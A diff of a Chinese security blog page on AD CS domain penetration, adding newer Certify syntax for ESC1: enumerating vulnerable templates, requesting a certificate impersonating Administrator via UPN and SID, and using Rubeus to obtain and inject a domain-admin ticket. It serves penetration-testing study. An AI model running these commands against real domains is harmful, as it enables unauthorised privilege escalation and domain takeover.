@@ -39,8 +39,11 @@
 <meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/Certificate%20Services-7.png">
 <meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/Certificate%20Services-8.png">
 <meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/Certificate%20Services-9.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/Certificate%20Services-10.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/Certificate%20Services-11.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/Certificate%20Services-12.png">
 <meta property="article:published_time" content="2026-05-23T10:00:00.000Z">
-<meta property="article:modified_time" content="2026-05-26T07:09:50.125Z">
+<meta property="article:modified_time" content="2026-05-31T12:56:16.868Z">
 <meta property="article:author" content="dr0n">
 <meta property="article:tag" content="内网渗透">
 <meta property="article:tag" content="域">
@@ -50,7 +53,7 @@
   
   
   
-  <title>域渗透学习(Certificate Services篇) - Dr0n&#39;s blog</title><meta name="robots" content="noindex">
+  <title>域渗透学习(Certificate Services篇) - Dr0n&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -430,7 +433,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.3k 字
+          3.1k 字
         
       </span>
     
@@ -441,7 +444,7 @@
         
         
         
-          18 分钟
+          23 分钟
         
       </span>
     
@@ -497,7 +500,7 @@
                 <p>AD CS（Active Directory Certificate Services）它是 Microsoft Windows Server 里的一个角色，用来在企业内部搭建 PKI 公钥基础设施，也就是发放、管理和吊销数字证书，是企业身份与加密信任体系的一部分。但如果配置不当，会带来严重的安全风险。</p>
 <h1 id="信息枚举"><a href="#信息枚举" class="headerlink" title="信息枚举"></a>信息枚举</h1><p>windows 主要用 <a target="_blank" rel="noopener" href="https://github.com/GhostPack/Certify">Certify.exe</a><br>linux 用 <a target="_blank" rel="noopener" href="https://github.com/ly4k/Certipy">Certipy</a>，kali上叫 certipy-ad</p>
 <p>域内机器枚举</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Windows 自带命令</span><br>certutil -config - -ping<br>certutil -CA<br><br><span class="hljs-comment"># 第三方工具</span><br>Certify.exe cas<br>Certify.exe find /vulnerable<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Windows 自带命令</span><br>certutil -config - -ping<br>certutil -CA<br><br><span class="hljs-comment"># 第三方工具</span><br>Certify.exe cas<br>Certify.exe find /vulnerable<br>Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins  <span class="hljs-comment"># 新版 Certify 语法</span><br></code></pre></td></tr></table></figure>
 
 <p><img src="/img/%E5%86%85%E7%BD%91/Certificate%20Services-1.png" srcset="/img/loading.gif" lazyload></p>
 <p>域外枚举，需要一个域账号密码</p>
@@ -530,7 +533,16 @@
 <p><strong>使用 Certify.exe</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1.在普通域用户下，使用 Certify.exe 以 administrator 身份发起证书申请</span><br>Certify.exe request /ca:aa.xxx.com\xxx-AA-CA /template:1 /altname:administrator<br><br><span class="hljs-comment"># 2.将申请的证书复制保存为 .pem，使用 openssl 转为 .pfx，密码为空即可。特别要注意如果使用的OpenSSL版本比较新需要加上 -legacy</span><br>openssl pkcs12 -legacy -<span class="hljs-keyword">in</span> cert.pem -keyex -CSP <span class="hljs-string">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> -<span class="hljs-built_in">export</span> -out cert.pfx<br><br><span class="hljs-comment"># 3.使用 Rubeus 请求域管 administrator 的 TGT 并注入</span><br>Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt<br></code></pre></td></tr></table></figure>
 
+
 <p><img src="/img/%E5%86%85%E7%BD%91/Certificate%20Services-9.png" srcset="/img/loading.gif" lazyload></p>
+<p>新版本 Certify 语法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1.证书申请</span><br><span class="hljs-comment"># SAN 可以采用两种格式之一：UserPrincipalName（使用 --upn 参数）或 DnsName（使用 --dns 参数）</span><br><span class="hljs-comment"># 对于启用了 强证书映射（Strong Certificate Mapping）的环境，还必须使用 --sid 参数提供目标用户的安全标识符（SID）</span><br>Certify.exe request --ca aa.xxx.com\xxx-AA-CA --template 1 --upn Administrator --sid S-1-5-21-854887597-2698481123-3746598263-513<br><br><br><span class="hljs-comment"># 2.使用 Rubeus 请求域管 administrator 的 TGT 并注入</span><br>Rubeus.exe asktgt /user:Administrator /certificate:MIACAQMwgAYJKoZIhv... /ptt<br><br><br><span class="hljs-comment"># 3.由于在请求 TGT 时向 Rubeus 提供了 /ptt 参数，该票据已经被注入到 Kerberos 票据列表中。因此可以访问该目标用户有权限访问的系统</span><br>Invoke-Command -ComputerName aa -ScriptBlock &#123;<span class="hljs-built_in">whoami</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91/Certificate%20Services-10.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果 Rubeus 报错 <code>KDC_ERR_PADATA_TYPE_NOSUPP</code> 可以尝试 certlm.msc 打开本地计算机证书管理器，将域控制器身份验证证书导入</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/Certificate%20Services-11.png" srcset="/img/loading.gif" lazyload></p>
+<p>或者 gpedit.msc 打开组策略，修改图中部分。改完记得刷新 <code>gpupdate /force</code></p>
+<p><img src="/img/%E5%86%85%E7%BD%91/Certificate%20Services-12.png" srcset="/img/loading.gif" lazyload></p>
 <h1 id="证书颁发机构"><a href="#证书颁发机构" class="headerlink" title="证书颁发机构"></a>证书颁发机构</h1><blockquote>
 <p>ESC6 and ESC12</p>
 </blockquote>
@@ -542,8 +554,8 @@
 </blockquote>
 <h1 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h1><hr>
 <p>参考文章</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Adminxe/article/details/129353293">ADCS攻击之证书模板配置错误 ESC1</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44001905/article/details/145833252">ADCS-ESC1漏洞环境构造与利用</a></p>
-<!-- flag of hidden posts -->
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Adminxe/article/details/129353293">ADCS攻击之证书模板配置错误 ESC1</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44001905/article/details/145833252">ADCS-ESC1漏洞环境构造与利用</a><br><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Certify/wiki/4-%E2%80%90-Escalation-Techniques">4 ‐ Escalation Techniques</a></p>
+
                 
               </div>
             
@@ -611,7 +623,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2026年5月26日</div>
+          <div>2026年5月31日</div>
         </div>
       
       
@@ -654,9 +666,21 @@
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/posts/a12d2be3/" title="春秋云境 Certify">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">春秋云境 Certify</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/posts/423657c3/" title="Go SSTI">
+                        <span class="hidden-mobile">Go SSTI</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
